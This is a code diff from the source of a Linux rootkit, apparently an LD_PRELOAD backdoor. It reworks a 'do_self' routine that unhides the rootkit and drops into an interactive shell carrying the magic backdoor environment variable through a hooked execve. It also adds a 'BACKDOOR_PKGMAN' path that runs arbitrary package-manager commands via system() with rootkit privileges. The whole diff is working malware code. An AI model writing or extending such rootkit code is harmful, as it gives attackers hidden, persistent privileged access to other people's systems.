@@ -4,34 +4,65 @@ void option_err(void){
 }
 
 void do_self(void){
-    int putenv_status;
-
     /* we need some kind of warning message. this will do for now. */
     printf("unhiding self...\n");
 
-    /* set the magic environment variable,
-     * so we still have our rootkit privs. */
-    if(getenv(BD_VAR) == NULL){
-        putenv_status = putenv(BD_VAR"=1");
-        if(putenv_status != 0)
-            printf("failed trying to set the magic environment variable.\ncontinuing anyway...\n");
-    }
-
+    chdir("/");
     unhide_self();
     system("id");
     printf("you're now totally visible. 'exit' when you want to return to being hidden.\n");
-    execl("/bin/sh", "-i", NULL);
+
+    char *args[3];
+    args[0] = "/bin/sh";
+    args[1] = "-i";
+    args[2] = NULL;
+
+#ifdef SET_MAGIC_ENV_UNHIDE
+    char *env[2];
+    env[0] = BD_VAR"=1";
+    env[1] = NULL;
+    hook(CEXECVE);
+    call(CEXECVE, args[0], args, env);
+#else
+    execl(args[0], args[1], NULL);
+#endif
+
     hide_self();
     exit(0);
 }
 
-void do_hidingutil(char *const argv[]){
+/* everything in here calls to misc rootkit utils. */
+void dobdvutil(char *const argv[]){
     char *option, *path;
     int path_status;
 
     option = argv[1];
     if(option == NULL)
         option_err();
+
+#ifdef BACKDOOR_PKGMAN
+    char *pkgman;
+    for(int pkgmani = 0; pkgmani != sizeofarr(validpkgmans); pkgmani++){
+        pkgman = validpkgmans[pkgmani];
+
+        if(!strcmp(pkgman, option)){
+            char argbuf[512], tmp[128];
+            memset(argbuf, 0, sizeof(argbuf));
+            chdir("/");
+            unhide_self();
+            system("id");
+            for(int argi = 1; argv[argi] != NULL; argi++){
+                memset(tmp, 0, sizeof(tmp));
+                snprintf(tmp, sizeof(tmp), "%s ", argv[argi]);
+                strcat(argbuf, tmp);
+            }
+            argbuf[strlen(argbuf)-1]='\0';
+            printf("system(\"%s\");\n", argbuf);
+            system(argbuf);
+            exit(0);
+        }
+    }
+#endif
 
 #ifdef READ_GID_FROM_FILE
     if(!strcmp("changegid", option)){
